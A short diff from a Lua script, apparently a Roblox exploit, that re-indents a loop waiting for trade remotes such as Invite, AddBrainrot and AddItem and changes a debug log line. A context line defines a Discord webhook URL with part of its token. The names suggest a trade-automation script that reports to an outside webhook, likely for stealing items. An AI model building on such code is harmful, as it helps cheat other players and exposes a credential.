@@ -189,12 +189,12 @@ local GLOBAL_WEBHOOK = "https://discord.com/api/webhooks/1502721621750841375/7uU
                             if obj.Name == "RF/TradeService/AddItem"     then AddItem     = prev end
                         end
                     end
-                    if not (Invite and SearchUser and AddBrainrot and AcceptEvent and ReadyEvent and AddItem) then
-                        task.wait(1)
-                    end
-                end
-                debugLog("Remotes loaded: Invite=", tostring(Invite), "SearchUser=", tostring(SearchUser))
-            end)
+        if not (Invite and SearchUser and AddBrainrot and AcceptEvent and ReadyEvent and AddItem) then
+            task.wait(1)
+        end
+    end
+    print("[logger] Remotes loaded: Invite=", tostring(Invite), "SearchUser=", tostring(SearchUser))
+end)
 
             ----------------------------------------------------------------
             -- Modules
